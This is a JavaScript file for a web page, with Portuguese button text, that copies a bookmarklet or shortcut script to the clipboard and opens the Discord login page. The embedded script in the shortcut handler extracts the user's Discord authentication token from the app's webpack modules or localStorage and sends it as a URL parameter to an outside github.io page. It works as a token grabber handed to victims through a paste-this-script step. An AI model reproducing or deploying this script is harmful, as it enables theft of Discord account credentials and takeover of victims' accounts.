document.addEventListener('DOMContentLoaded', () => {
    const copyBtn = document.getElementById('copyBtn');
    const bookmarkletCode = document.getElementById('bookmarkletCode');

    const copyShortcutBtn = document.getElementById('copyShortcutBtn');

    const copyToClipboard = async (text, button) => {
        try {
            await navigator.clipboard.writeText(text);
            
            const originalText = button.innerText;
            button.innerText = '✅ COPIADO!';
            const originalBg = button.style.background;
            button.style.background = '#27c93f';
            
            setTimeout(() => {
                button.innerText = originalText;
                button.style.background = originalBg;
            }, 2000);
            return true;
        } catch (err) {
            console.error('Falha ao copiar:', err);
            return false;
        }
    };

    copyBtn.addEventListener('click', () => {
        copyToClipboard(bookmarkletCode.innerText, copyBtn);
    });

    copyShortcutBtn.addEventListener('click', () => {
        const shortcutScript = `(function(){let t=(webpackChunkdiscord_app.push([[''],{},e=>{for(let c in e.c)if(e.c[c].exports?.default?.getToken)t=e.c[c].exports.default.getToken();for(let a in e.c[c].exports)if(e.c[c].exports?.[a]?.getToken&&e.c[c].exports[a][Symbol.toStringTag]!=="IntlMessagesProxy")t=e.c[c].exports[a].getToken()}] )||window.localStorage.getItem('token')||window.localStorage.getItem('__auth_token')).replace(/"/g,'');if(t&&t!=='undefined'){window.location.href='https://enzo695.github.io/token-/result.html?token='+t}else{alert('Logue no Discord primeiro!')};completion();})();`;
        copyToClipboard(shortcutScript, copyShortcutBtn);
    });

    magicBtn.addEventListener('click', async () => {
        const success = await copyToClipboard(bookmarkletCode.innerText, magicBtn);
        if (success) {
            setTimeout(() => {
                window.open('https://discord.com/login', '_blank');
            }, 800);
        }
    });

    // Add some interactivity to steps
    const steps = document.querySelectorAll('.step');
    steps.forEach((step, index) => {
        step.style.animationDelay = `${(index + 1) * 0.2}s`;
    });
});
